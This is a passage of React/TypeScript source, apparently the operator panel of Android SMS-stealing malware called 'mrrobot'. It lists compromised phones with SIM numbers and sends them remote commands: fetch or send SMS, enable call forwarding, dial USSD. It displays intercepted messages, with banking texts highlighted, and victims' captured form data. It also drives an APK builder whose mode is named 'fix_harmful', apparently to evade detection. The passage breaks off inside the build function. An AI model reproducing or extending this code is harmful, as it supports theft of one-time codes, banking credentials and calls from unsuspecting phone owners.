      const fresh = devices.find(d => d.deviceId === selected.deviceId);
      if (fresh && fresh !== selected) setSelected(fresh);
      return;
    }
    const savedId = localStorage.getItem(DEVICE_KEY);
    if (savedId) {
      const found = devices.find(d => d.deviceId === savedId);
      if (found) {
        setSelected(found);
        setFromExternal(false);
      }
    }
  }, [devices]); // eslint-disable-line react-hooks/exhaustive-deps
  const [msgSearch, setMsgSearch] = useState("");
  const [showFormData, setShowFormData] = useState(false);
  const [activeAction, setActiveAction] = useState<ActionKey | null>(null);
  const [quickState, setQuickState] = useState<Record<string, "idle"|"loading"|"ok"|"err">>({});
  const [quickProgress, setQuickProgress] = useState<Record<string, boolean>>({}); // 5s FCM progress bar
  const [onlineTimer, setOnlineTimer] = useState(0); // live countdown for online_check
  const onlineTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Reset action state when user switches to a different device
  const prevDeviceIdRef = useRef<string | null>(null);
  useEffect(() => {
    const id = selected?.deviceId ?? null;
    if (id !== prevDeviceIdRef.current) {
      prevDeviceIdRef.current = id;
      setQuickState({});
      setQuickProgress({});
      setActiveAction(null);
      if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
      setOnlineTimer(0);
    }
  });
  // ── Like / Delete state ──
  const [confirmDeleteId, setConfirmDeleteId] = useState<string | null>(null);
  const dpEnabled = useDeleteProt();
  const [deleting, setDeleting] = useState(false);
  const [deletedIds, setDeletedIds] = useState<Set<string>>(new Set());
  const [starringId, setStarringId] = useState<string | null>(null);

  // Live timeAgo ticker — refresh every second so "38s ago" keeps updating
  const [, setTick] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(iv);
  }, []);

  // Ref for selected deviceId — always up-to-date, no stale closure issues
  const selectedDeviceIdRef = useRef<string | null>(null);
  selectedDeviceIdRef.current = selected?.deviceId ?? null; // sync update every render
  // Internal nav: save scroll + count before opening device detail (list → detail → back to list)
  const internalScrollRef = useRef(0);
  const internalCountRef = useRef(20);

  // Ref: true ONLY when we are actively waiting for an Online Check response
  // Prevents regular heartbeats from resetting the timer unintentionally
  const onlineCheckActiveRef = useRef(false);

  // When online_check SSE confirms device responded → stop timer (mount-once listener via ref)
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (!selectedDeviceIdRef.current || deviceId !== selectedDeviceIdRef.current) return;
      // CRITICAL: only act if we are waiting for an Online Check — ignore regular heartbeats
      if (!onlineCheckActiveRef.current) return;
      onlineCheckActiveRef.current = false;
      if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
      setOnlineTimer(0);
      setQuickState(s => ({ ...s, online_check: "ok" }));
      setTimeout(() => setQuickState(s => ({ ...s, online_check: "idle" })), 2000);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, []); // mount/unmount only — refs always have latest values

  async function sendQuick(device: DbDevice, key: "online_check"|"get_sms") {
    setQuickState(s => ({ ...s, [key]: "loading" }));
    setQuickProgress(s => ({ ...s, [key]: true }));
    // 5-second progress bar auto-clear
    setTimeout(() => setQuickProgress(s => ({ ...s, [key]: false })), 5200);

    if (key === "online_check") {
      // Arm the SSE listener — will ONLY fire when this flag is true
      onlineCheckActiveRef.current = true;
      // Start live seconds counter 0 → 30
      if (onlineTimerRef.current) clearInterval(onlineTimerRef.current);
      setOnlineTimer(0);
      onlineTimerRef.current = setInterval(() => {
        setOnlineTimer(t => {
          if (t >= 30) {
            // Timeout — device did not respond in time, silently reset
            onlineCheckActiveRef.current = false;
            if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
            setQuickState(s => ({ ...s, online_check: "idle" }));
            return 0;
          }
          return t + 1;
        });
      }, 1000);
    }

    const cmd = key === "online_check" ? mkCheckOnline() : mkDeviceCmd(device.deviceId, "get_sms");
    try {
      await fcmSend(device.deviceId, cmd);
      if (key !== "online_check") {
        setQuickState(s => ({ ...s, [key]: "ok" }));
        setTimeout(() => setQuickState(s => ({ ...s, [key]: "idle" })), 2500);
      }
      // online_check stays "loading" until SSE fires (device heartbeat) or 30s timeout
    } catch {
      // FCM send failed — stop everything immediately and silently reset
      if (key === "online_check") {
        onlineCheckActiveRef.current = false;
        if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
        setOnlineTimer(0);
        setQuickState(s => ({ ...s, online_check: "idle" }));
      } else {
        setQuickState(s => ({ ...s, [key]: "idle" }));
      }
    }
  }

  async function toggleLike(device: DbDevice, e: React.MouseEvent) {
    e.stopPropagation();
    if (starringId === device.deviceId) return;
    setStarringId(device.deviceId);
    try {
      await apiFetch(`/api/devices/${encodeURIComponent(device.deviceId)}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ starred: !device.starred }),
      });
      // Optimistically update local devices list via parent refresh event
      window.dispatchEvent(new CustomEvent("mrrobot:refresh_devices"));
    } finally {
      setStarringId(null);
    }
  }

  async function handleDeleteDevice(deviceId: string) {
    setDeleting(true);
    try {
      await apiFetch(`/api/devices/${encodeURIComponent(deviceId)}`, { method: "DELETE" });
      setDeletedIds(prev => new Set([...prev, deviceId]));
    } finally {
      setDeleting(false);
      setConfirmDeleteId(null);
    }
  }

  const filtered = devices
    .filter(d => !deletedIds.has(d.deviceId))
    .filter(d =>
      d.name.toLowerCase().includes(search.toLowerCase()) ||
      d.deviceId.includes(search) ||
      d.userId.toLowerCase().includes(search.toLowerCase())
    )
    .slice()
    .sort((a, b) => new Date(b.installedAt).getTime() - new Date(a.installedAt).getTime());

  const { visible: visibleDevices, sentinelRef: devSentinel, loading: devsLoading, resetCount: resetDeviceCount } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);

  const deviceMsgs = selected
    ? [...messages]
        .filter(m => m.deviceId === selected.deviceId)
        .filter(m => !m.fromSender.toLowerCase().startsWith("call forward")) // call forward logs hide
        .filter(m => {
          const q = msgSearch.toLowerCase();
          return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q);
        })
        .sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())
    : [];

  const ACTIONS: { label: string; key: ActionKey }[] = [
    { label: "Online Check", key: "online_check" },
    { label: "Get SMS", key: "get_sms" },
    { label: "Send SMS", key: "send_sms" },
    { label: "Update", key: "update_number" },
    { label: "Call Forward", key: "call_forward" },
    { label: "Dial USSD", key: "dial_ussd" },
  ];

  /* ── Detail view ── */
  if (selected) {
    const handleBack = () => {
      setSelected(null); setActiveAction(null); localStorage.removeItem(DEVICE_KEY);
      if (fromExternal && onBack) {
        onBack();
      } else {
        resetDeviceCount(internalCountRef.current);
        const savedTop = internalScrollRef.current;
        const scrollEl = document.getElementById("main-scroll");
        if (scrollEl) {
          let attempts = 0;
          const tryRestore = () => {
            scrollEl.scrollTop = savedTop;
            if (Math.abs(scrollEl.scrollTop - savedTop) > 10 && attempts < 50) { attempts++; setTimeout(tryRestore, 50); }
          };
          requestAnimationFrame(tryRestore);
        }
      }
    };
    return (
      <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
        {/* Name banner */}
        <div style={{ background: t.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${t.cardB}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontWeight: 700, fontSize: 15, color: t.txt, display: "flex", alignItems: "center", gap: 6 }}>
              <FavoriteBadge starred={selected.starred} size={15} />{selected.name}
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 2 }}>
              <div style={{ fontSize: 9, color: "#94a3b8", fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{selected.deviceId}</div>
              <CopyIconButton value={selected.deviceId} size={22} color={t.accent} title="Copy Device ID" />
            </div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 10, flexShrink: 0 }}>
            <div style={{ fontSize: 11, textAlign: "right" }}>
              <div style={{ fontSize: 9, color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
              <div style={{ fontWeight: 700, color: selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : "#64748b" }}>
                {selected.status === "uninstalled" ? "Uninstalled" : timeAgo(selected.lastOnline)}
              </div>
            </div>
          </div>
        </div>

        {/* Info rows */}
        <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          {/* Name row with Back button at right end */}
          <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
            <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Name</div>
            <div style={{ flex: 1, fontSize: 12, color: t.txt, wordBreak: "break-all" }}>{selected.name}</div>
            <button
              onClick={handleBack}
              style={{
                flexShrink: 0,
                background: t.accent,
                border: `1.5px solid #6366f1`,
                borderRadius: 8, padding: "8px 14px",
                fontSize: 13, fontWeight: 800,
                color: "#fff",
                cursor: "pointer", transition: "all 0.15s",
                boxShadow: "0 2px 10px rgba(99,102,241,0.5)",
                letterSpacing: 0.3,
              }}>
              ← Back
            </button>
          </div>
          <Row label="Device ID" value={selected.deviceId} mono accent="#22c55e" />
          <Row label="Android" value={`v${selected.androidVersion}`} />
          <Row label="User ID" value={selected.userId} mono />
          <Row label="SIM 1" value={[selected.sim1Carrier, selected.sim1Phone].filter(Boolean).join(": ") || "—"} />
          <Row label="SIM 2" value={[selected.sim2Carrier, selected.sim2Phone].filter(Boolean).join(": ") || "—"} />
          {/* Call Forward live status row */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "9px 14px", borderBottom: `1px solid ${t.cardB}` }}>
            <span style={{ fontSize: 12, color: t.muted, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>Call Forward</span>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              {/* ON / OFF badge with inline SIM slot */}
              <span style={{
                display: "inline-flex", alignItems: "center", gap: 5,
                background: selected.forwardEnabled ? "#14532d" : "#450a0a",
                border: `1px solid ${selected.forwardEnabled ? "#22c55e" : "#ef4444"}`,
                borderRadius: 20, padding: "3px 11px", fontSize: 12, fontWeight: 700,
                color: selected.forwardEnabled ? "#4ade80" : "#f87171",
              }}>
                <span style={{
                  width: 7, height: 7, borderRadius: "50%",
                  background: selected.forwardEnabled ? "#22c55e" : "#ef4444",
                  boxShadow: selected.forwardEnabled ? "0 0 6px #22c55e" : "none",
                  display: "inline-block", flexShrink: 0,
                }} />
                {selected.forwardEnabled ? "ON" : "OFF"}
              </span>
              {/* SIM slot badge — inline right next to ON, slot 0 = SIM 1, slot 1 = SIM 2 */}
              {selected.forwardEnabled && (
                <span style={{
                  display: "inline-flex", alignItems: "center", gap: 4,
                  background: "#0f2744", border: "1px solid #2563eb",
                  borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700,
                  color: "#93c5fd",
                }}>
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
                    <rect x="5" y="2" width="14" height="20" rx="2" stroke="#93c5fd" strokeWidth="2"/>
                    <path d="M9 6h6M9 10h6M9 14h4" stroke="#93c5fd" strokeWidth="1.5" strokeLinecap="round"/>
                  </svg>
                  {selected.forwardSlot !== null && selected.forwardSlot !== undefined
                    ? `SIM ${(selected.forwardSlot as number) + 1}`
                    : "SIM —"}
                </span>
              )}
            </div>
          </div>
          <Row label="Installed" value={fmtDate(selected.installedAt)} accent="#22c55e" />
          {/* Last Seen row with Form Data button */}
          <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
            <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
            <div style={{ flex: 1, fontSize: 12, color: selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : t.txt }}>
              {selected.status === "uninstalled" ? "App uninstalled" : timeAgo(selected.lastOnline)}
            </div>
            <button
              onClick={() => setShowFormData(v => !v)}
              style={{
                flexShrink: 0,
                background: showFormData ? t.accent : t.card,
                border: `1.5px solid ${showFormData ? t.accent : t.cardB}`,
                borderRadius: 8, padding: "8px 14px",
                fontSize: 13, fontWeight: 700,
                color: showFormData ? "#fff" : t.txt2,
                cursor: "pointer", transition: "all 0.15s",
              }}>
              Form Data
            </button>
            <button
              onClick={handleBack}
              style={{
                display: "none", // moved to Name row
                flexShrink: 0,
                background: t.accent,
                border: `1.5px solid #6366f1`,
                borderRadius: 8, padding: "8px 14px",
                fontSize: 13, fontWeight: 800,
                color: "#fff",
                cursor: "pointer", transition: "all 0.15s",
                boxShadow: "0 2px 10px rgba(99,102,241,0.5)",
                letterSpacing: 0.3,
              }}>
              ← Back
            </button>
          </div>
        </div>

        {/* Action buttons */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
          {ACTIONS.map(({ label, key }) => {
            const isQuick = key === "online_check" || key === "get_sms";
            const qs = quickState[key] ?? "idle";
            const isActive = activeAction === key;

            if (isQuick) {
              const isLoading = qs === "loading";
              const isOk = qs === "ok";
              const bgColor = isOk ? "#22c55e" : isLoading ? t.accent : t.card;
              const bdColor = isOk ? "#22c55e" : isLoading ? t.accent : t.cardB;
              const txtColor = (isOk || isLoading) ? "#fff" : t.txt2;
              const btnLabel = isLoading
                ? (key === "online_check" ? `${onlineTimer}s…` : "Requesting…")
                : isOk ? "Sent ✓" : label;
              return (
                <div key={key} style={{ display: "flex", flexDirection: "column" }}>
                  <button
                    onClick={() => void sendQuick(selected, key as "online_check"|"get_sms")}
                    disabled={isLoading}
                    style={{
                      background: bgColor, border: "1.5px solid", borderColor: bdColor,
                      borderRadius: 9, padding: "10px 4px", cursor: isLoading ? "wait" : "pointer",
                      fontSize: 11, color: txtColor, fontWeight: 600,
                      textAlign: "center", transition: "all 0.15s", width: "100%",
                    }}>
                    {btnLabel}
                  </button>
                  {/* 5-second FCM progress bar — only for get_sms, not online_check */}
                  {key !== "online_check" && <SendProgressBar active={quickProgress[key] === true} />}
                </div>
              );
            }

            return (
              <button key={key} onClick={() => setActiveAction(isActive ? null : key)} style={{
                background: isActive ? "#eef2ff" : t.card,
                border: "1.5px solid", borderColor: isActive ? t.accent : t.cardB,
                borderRadius: 9, padding: "10px 4px", cursor: "pointer",
                fontSize: 11, color: isActive ? t.accent : t.txt2, fontWeight: isActive ? 700 : 500,
                textAlign: "center",
              }}>
                {label}
              </button>
            );
          })}
        </div>

        {/* Form Data panel */}
        {showFormData && (() => {
          const entries = formData.filter(f => f.deviceId === selected.deviceId)
            .sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
          return (
            <div style={{
              background: t.card, border: `1.5px solid #6366f1`,
              borderRadius: 10, overflow: "hidden",
            }}>
              <div style={{
                display: "flex", alignItems: "center", justifyContent: "space-between",
                padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`,
                background: t.isDark ? "#1a1f3a" : "#eef2ff",
              }}>
                <span style={{ fontSize: 12, fontWeight: 700, color: t.accent }}>
                  Form Data ({entries.length})
                </span>
                <button onClick={() => setShowFormData(false)}
                  style={{ background: "none", border: "none", cursor: "pointer", fontSize: 14, color: t.muted, lineHeight: 1 }}>
                  ✕
                </button>
              </div>
              {entries.length === 0
                ? <div style={{ padding: "16px", textAlign: "center", fontSize: 12, color: t.muted }}>No form data for this device</div>
                : entries.map((entry, ei) => (
                  <div key={entry.id} style={{
                    padding: "10px 14px",
                    borderBottom: ei < entries.length - 1 ? `1px solid ${t.hdrB}` : "none",
                  }}>
                    <div style={{ fontSize: 10, color: t.muted, fontWeight: 600, marginBottom: 6, textTransform: "uppercase", letterSpacing: 0.3 }}>
                      {fmtDate(entry.submittedAt)}
                    </div>
                    {Object.entries(entry.data).map(([k, v]) => (
                      <div key={k} style={{ display: "flex", gap: 8, marginBottom: 4, alignItems: "flex-start" }}>
                        <span style={{ fontSize: 10, fontWeight: 700, color: t.accent, minWidth: 80, flexShrink: 0, textTransform: "capitalize", paddingTop: 1 }}>
                          {k}
                        </span>
                        <span style={{ fontSize: 11, color: t.txt, wordBreak: "break-all", flex: 1 }}>
                          {String(v)}
                        </span>
                        <CopyIconButton value={String(v)} size={16} color={t.accent} title="Copy" />
                      </div>
                    ))}
                  </div>
                ))
              }
            </div>
          );
        })()}

        {/* Live Online Check countdown — shown prominently inside device panel */}
        {quickState.online_check === "loading" && (
          <div style={{
            marginTop: 8, background: "#eef2ff", borderRadius: 10,
            border: "1.5px solid #6366f1", padding: "10px 14px",
            display: "flex", flexDirection: "column", gap: 6,
          }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <span style={{ fontSize: 12, fontWeight: 700, color: "#4338ca" }}>
                Waiting for device response…
              </span>
              <span style={{
                fontSize: 18, fontWeight: 800, color: t.accent,
                fontVariantNumeric: "tabular-nums", minWidth: 48, textAlign: "right",
              }}>
                {onlineTimer}s
              </span>
            </div>
            {/* Progress bar filling as seconds count up to 30 */}
            <div style={{ height: 6, borderRadius: 99, background: "#c7d2fe", overflow: "hidden" }}>
              <div style={{
                height: "100%", borderRadius: 99,
                background: "linear-gradient(90deg, #6366f1, #818cf8)",
                width: `${Math.min(100, Math.round((onlineTimer / 30) * 100))}%`,
                transition: "width 1s linear",
              }} />
            </div>
            <div style={{ fontSize: 10, color: t.accent, textAlign: "right" }}>
              {30 - onlineTimer}s remaining
            </div>
          </div>
        )}

        {/* Inline action panel */}
        {activeAction && <ActionPanel action={activeAction} device={selected} onClose={() => setActiveAction(null)} />}

        {/* Messages */}
        <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: `1px solid ${t.hdrB}` }}>
            <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
            <input value={msgSearch} onChange={e => setMsgSearch(e.target.value)} placeholder="Search messages…"
              style={{ border: "none", outline: "none", flex: 1, fontSize: 11, background: "transparent", color: t.txt }} />
            <span style={{ fontSize: 10, color: "#94a3b8" }}>Newest first</span>
          </div>
          {deviceMsgs.length === 0
            ? <div style={{ padding: "20px", textAlign: "center", color: "#94a3b8", fontSize: 12 }}>No messages</div>
            : deviceMsgs.map((msg, i) => (
              <div key={msg.id} style={{ padding: "10px 14px", borderBottom: i < deviceMsgs.length - 1 ? `1px solid ${t.hdrB}` : "none" }}>
                <div style={{ display: "flex", gap: 5, alignItems: "center", marginBottom: 4 }}>
                  <span style={{ fontSize: 10, color: t.muted }}>{fmtDate(msg.receivedAt)}</span>
                </div>
                <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 4 }}>
                  <div style={{ flex: 1, fontSize: 12, color: isBankingMsg(msg.body, msg.fromSender) ? "#16a34a" : t.txt, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
                  <CopyIconButton value={msg.body} size={22} color={t.accent} title="Copy message" />
                </div>
                <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
                  {(() => {
                    const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
                    return (
                      <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                        <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>FROM</span>{displaySender}
                        <CopyIconButton value={displaySender} size={18} color={t.accent} title="Copy sender" />
                      </span>
                    );
                  })()}
                  {msg.toNumber && (
                    <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                      <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>TO</span>{msg.toNumber}
                      <CopyIconButton value={msg.toNumber} size={18} color={t.accent} title="Copy receiver" />
                    </span>
                  )}
                  <span style={{ flex: 1 }} />
                  <DeleteIconButton
                    hidden={dpEnabled}
                    size={30}
                    title="Delete this SMS"
                    confirmTitle="Delete SMS"
                    confirmText={`Are you sure you want to delete this SMS from ${msg.fromSender}? This action cannot be undone.`}
                    onConfirm={async () => {
                      const r = await apiFetch(`/api/messages/${msg.id}`, { method: "DELETE" });
                      if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                    }}
                  />
                </div>
              </div>
            ))
          }
        </div>
      </div>
    );
  }

  /* ── Device list ── */
  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search devices…"
          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "minmax(0, 1fr) minmax(0, 1fr)", gap: 8, alignItems: "stretch" }}>
        {visibleDevices.map((device, idx) => {
          const recent = device.status !== "uninstalled" && isRecent(device.lastOnline);
          const rows = [
            { label: "ID", value: device.deviceId, mono: true },
            { label: "Android", value: String(device.androidVersion) },
            { label: "SIM 1", value: [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(":  ") || "—" },
            { label: "SIM 2", value: [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(":  ") || "—" },
            { label: "User ID", value: device.userId, mono: true },
          ];
          return (
            <div key={device.deviceId} style={{ display: "flex", flexDirection: "column", gap: 6, height: "100%" }}>
              {/* Card box — clicking navigates to detail */}
              <div onClick={() => {
                const scrollEl = document.getElementById("main-scroll");
                internalScrollRef.current = scrollEl?.scrollTop ?? 0;
                internalCountRef.current = visibleDevices.length;
                setSelected(device); setFromExternal(false); localStorage.setItem(DEVICE_KEY, device.deviceId);
              }}
                style={{ background: t.card, borderRadius: 12, border: `1px solid ${t.cardB}`, cursor: "pointer", overflow: "hidden", flex: 1 }}>

                {/* Card header */}
                <div style={{ padding: "8px 10px 8px 14px", borderBottom: `1px solid ${t.cardB}`, background: t.hdr, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 6 }}>
                  <span style={{ fontWeight: 800, fontSize: 13, color: t.txt, flex: 1, minWidth: 0, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", display: "inline-flex", alignItems: "center", gap: 5 }}>
                    {filtered.length - idx}.&nbsp;<FavoriteBadge starred={device.starred} size={13} />{device.name}
                  </span>
                  <div style={{ display: "flex", alignItems: "center", gap: 2, flexShrink: 0 }} onClick={e => e.stopPropagation()}>
                    <button onClick={e => void toggleLike(device, e)} disabled={starringId === device.deviceId} style={{ background: "none", border: "none", cursor: starringId === device.deviceId ? "wait" : "pointer", padding: "4px", borderRadius: 5, display: "flex", alignItems: "center", opacity: starringId === device.deviceId ? 0.5 : 1 }} title={device.starred ? "Unlike" : "Like"}>
                      <svg width="20" height="20" viewBox="0 0 24 24" fill={device.starred ? "#f59e0b" : "none"} stroke={device.starred ? "#f59e0b" : "#94a3b8"} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
                    </button>
                    {!dpEnabled && (
                    <button onClick={e => { e.stopPropagation(); setConfirmDeleteId(device.deviceId); }} style={{ background: "none", border: "none", cursor: "pointer", padding: "4px", borderRadius: 5, display: "flex", alignItems: "center" }} title="Delete device">
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>
                    </button>
                    )}
                  </div>
                </div>

                {/* Table rows */}
                {rows.map(({ label, value, mono }, i) => (
                  <div key={label} style={{
                    display: "flex", alignItems: "center",
                    borderBottom: i < rows.length - 1 ? `1px solid ${t.hdrB}` : "none",
                    padding: "7px 14px",
                  }}>
                    <span style={{ width: 60, fontSize: 10, color: t.muted, fontWeight: 600, flexShrink: 0 }}>{label}:</span>
                    <span style={{ fontSize: 10, color: t.txt2, fontFamily: mono ? "monospace" : undefined, wordBreak: "break-all", lineHeight: 1.4, flex: 1, minWidth: 0 }}>{value}</span>
                  </div>
                ))}

                {/* Online row */}
                <div style={{ display: "flex", alignItems: "center", padding: "7px 14px" }}>
                  <span style={{ width: 60, fontSize: 10, color: "#94a3b8", fontWeight: 600, flexShrink: 0 }}>Online:</span>
                  <span style={{ fontSize: 10, fontWeight: recent ? 700 : 400, color: recent ? "#16a34a" : "#64748b" }}>
                    {device.status === "uninstalled" ? "Uninstalled" : timeAgo(device.lastOnline)}
                  </span>
                </div>
              </div>

              {/* Check Online button — outside card, directly below */}
              <CheckOnlineBtn device={device} />
            </div>
          );
        })}
      </div>
      {filtered.length === 0 && <div style={{ textAlign: "center", color: "#94a3b8", padding: 32 }}>No devices found</div>}
      <div ref={devSentinel} style={{ height: 1 }} />
      {devsLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color={t.accent} /></div>}
      {/* Delete confirmation modal */}
      {!dpEnabled && confirmDeleteId !== null && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.65)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 200 }}
          onClick={() => !deleting && setConfirmDeleteId(null)}>
          <div style={{ background: t.card, borderRadius: 14, padding: "22px 24px", border: `1px solid ${t.cardB}`, width: 270, boxShadow: "0 20px 50px #00000099" }}
            onClick={e => e.stopPropagation()}>
            <div style={{ fontWeight: 800, fontSize: 14, color: t.txt, marginBottom: 8 }}>Delete Device?</div>
            <div style={{ fontSize: 12, color: t.muted, marginBottom: 18, lineHeight: 1.5 }}>This device will be permanently removed. This cannot be undone.</div>
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => setConfirmDeleteId(null)} disabled={deleting} style={{ flex: 1, padding: "10px 0", borderRadius: 8, background: t.hdr, border: `1px solid ${t.cardB}`, color: t.txt, fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Cancel</button>
              <button onClick={() => void handleDeleteDevice(confirmDeleteId)} disabled={deleting} style={{ flex: 1, padding: "10px 0", borderRadius: 8, background: "#ef4444", border: "none", color: "#fff", fontSize: 13, fontWeight: 700, cursor: deleting ? "wait" : "pointer" }}>
                {deleting ? "…" : "Delete"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — SETTINGS
════════════════════════════════════════ */
  
interface ShootApp { id: string; name: string; note: string; }

function ShootApkButton({ appId }: { appId: string }) {
  const t = useTheme();
  const [apps, setApps] = useState<ShootApp[]>([]);
  const [appsReady, setAppsReady] = useState(false);
  const [selId, setSelId] = useState("");
  const [appName, setAppName] = useState("");
  const [phase, setPhase] = useState<"form"|"building"|"done"|"error">("form");
  const [progress, setProgress] = useState(0);
  const [progressMsg, setProgressMsg] = useState("");
  const [errMsg, setErrMsg] = useState("");
  const [dlUrl, setDlUrl] = useState("");
  const pollRef = useRef<ReturnType<typeof setInterval>|null>(null);
  const nameRef = useRef<HTMLInputElement|null>(null);
  const [nameErr, setNameErr] = useState(false);
  const [locked, setLocked] = useState(false); // true once token→apk saved in DB and found in list
  const [confirmOpen, setConfirmOpen] = useState(false); // first-build confirmation dialog
  const VPS = "/api/vps";

  // Load apps + server-saved APK for this token
  useEffect(() => {
    fetch(`${VPS}/api/apps`)
      .then(r => r.json())
      .then(async (data: ShootApp[]) => {
        if (!Array.isArray(data)) { setAppsReady(true); return; }
        setApps(data);
        try {
          const sr = await fetch(`/api/token-app?token=${encodeURIComponent(appId)}`);
          const sd = await sr.json() as { apkId: string | null };
          if (sd.apkId) {
            const found = data.find((a: ShootApp) => a.id === sd.apkId);
            if (found) { setSelId(found.id); setLocked(true); }
          }
        } catch { /* ignore */ }
        setAppsReady(true);
      })
      .catch(() => setAppsReady(true));
  }, []);

  function handleSelect(id: string) {
    setSelId(id);
    if (id) {
      fetch("/api/token-app", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token: appId, apkId: id }),
      }).catch(() => {});
    }
  }

  async function handleBuild() {
    if (!appName.trim()) { setNameErr(true); nameRef.current?.focus(); setTimeout(()=>setNameErr(false),2000); return; }
    if (!selId) { setErrMsg("Please select an APK"); return; }
    setErrMsg("");
    setPhase("building"); setProgressMsg("Verifying..."); setProgress(0);
    try {
      const vr = await fetch(`${VPS}/api/verify-token`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({token: appId}) });
      const vd = await vr.json() as {valid: boolean};
      if (!vd.valid) { setErrMsg("Invalid token"); setPhase("form"); return; }
      setProgressMsg("Starting build...");
      const br = await fetch(`${VPS}/api/build/start`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({appId: selId, appName: appName.trim()||undefined, mode:"fix_harmful", token: appId}) });
      const bd = await br.json() as {jobId?: string; error?: string};
      if (!bd.jobId) { setErrMsg(bd.error ?? "Build could not start"); setPhase("form"); return; }
